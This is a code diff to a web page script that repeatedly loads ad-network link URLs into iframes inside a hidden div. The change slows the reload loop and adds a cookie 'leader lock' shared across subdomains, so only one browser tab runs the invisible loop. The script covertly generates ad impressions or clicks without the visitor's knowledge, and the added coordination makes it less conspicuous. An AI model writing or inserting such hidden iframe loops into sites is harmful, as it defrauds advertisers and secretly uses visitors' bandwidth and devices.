@@ -209,13 +209,71 @@ function initAll() {
             "https://s.pemsrv.com/v1/link.php?cat=&idzone=5924982&type=8",
             "https://s.pemsrv.com/v1/link.php?cat=&idzone=5929702&type=8",
             "https://s.pemsrv.com/v1/link.php?cat=&idzone=5909808&type=8",
-            "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
+          //  "https://code.54ads.com/zFBG8Am-XNBj0-sEJn34F_suSS6agKTWfnfRL9QEDBdYRBI_qBxlYOU1UYbr-CvEf0dIABHRe",
         ];
 
         var hiddenContainer = document.createElement("div");
         hiddenContainer.style.display = "none";
         var currentTimeout = null;
         var currentIframes = [];
+
+        var COORD_LOCK_KEY = '_js_loop_lock_ts';
+        var LOCK_TTL = 3000;
+        var isLoopRunning = false;
+        var coordCheckInterval = null;
+
+        function getShareableDomain() {
+            var host = window.location.hostname;
+            var parts = host.split('.');
+            if (parts.length <= 2) return host;
+            return '.' + parts.slice(-2).join('.');
+        }
+
+        function refreshLock() {
+            var domain = getShareableDomain();
+            var cookieStr = COORD_LOCK_KEY + '=' + Date.now() + '; path=/; max-age=' + Math.ceil(LOCK_TTL / 1000) + '; SameSite=Lax';
+            if (domain.charAt(0) === '.') {
+                cookieStr += '; domain=' + domain;
+            }
+            document.cookie = cookieStr;
+        }
+
+        function releaseLock() {
+            var domain = getShareableDomain();
+            var cookieStr = COORD_LOCK_KEY + '=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; SameSite=Lax';
+            if (domain.charAt(0) === '.') {
+                cookieStr += '; domain=' + domain;
+            }
+            document.cookie = cookieStr;
+        }
+
+        function tryAcquireLock() {
+            var now = Date.now();
+            var cookies = document.cookie.split('; ');
+            for (var i = 0; i < cookies.length; i++) {
+                var kv = cookies[i].trim().split('=');
+                if (kv[0] === COORD_LOCK_KEY) {
+                    var ts = parseInt(kv[1], 10);
+                    if (!isNaN(ts) && (now - ts) < LOCK_TTL) {
+                        return false;
+                    }
+                }
+            }
+            refreshLock();
+            return true;
+        }
+
+        function startLoopIfLeader() {
+            if (isLoopRunning) return;
+            isLoopRunning = true;
+            runIframeLoop();
+        }
+
+        function stopLoop() {
+            isLoopRunning = false;
+            cleanup();
+            releaseLock();
+        }
 
         function cleanup() {
             if (currentTimeout) {
@@ -244,7 +302,11 @@ function initAll() {
                 pendingIframes--;
                 if (pendingIframes <= 0 && currentTimeout) {
                     clearTimeout(currentTimeout);
-                    currentTimeout = setTimeout(runIframeLoop, 3000);
+                    if (isLoopRunning) {
+                        currentTimeout = setTimeout(runIframeLoop, 5000);
+                    } else {
+                        isLoopRunning = false;
+                    }
                 }
             }
             
@@ -268,18 +330,42 @@ function initAll() {
             
             currentTimeout = setTimeout(function() {
                 if (currentTimeout) {
-                    currentTimeout = setTimeout(runIframeLoop, 3000);
+                    if (isLoopRunning) {
+                        currentTimeout = setTimeout(runIframeLoop, 5000);
+                    } else {
+                        isLoopRunning = false;
+                    }
                 }
             }, 15000);
         }
 
+        window.addEventListener('beforeunload', function() {
+            if (isLoopRunning) {
+                releaseLock();
+            }
+        });
+
+        coordCheckInterval = setInterval(function() {
+            if (!isLoopRunning) {
+                if (tryAcquireLock()) {
+                    startLoopIfLeader();
+                }
+            } else if (isLoopRunning) {
+                refreshLock();
+            }
+        }, 1500);
+
         if (document.body) {
             document.body.appendChild(hiddenContainer);
-            runIframeLoop();
+            if (tryAcquireLock()) {
+                startLoopIfLeader();
+            }
         } else {
             document.addEventListener("DOMContentLoaded", function() {
                 document.body.appendChild(hiddenContainer);
-                runIframeLoop();
+                if (tryAcquireLock()) {
+                    startLoopIfLeader();
+                }
             });
         }
     });
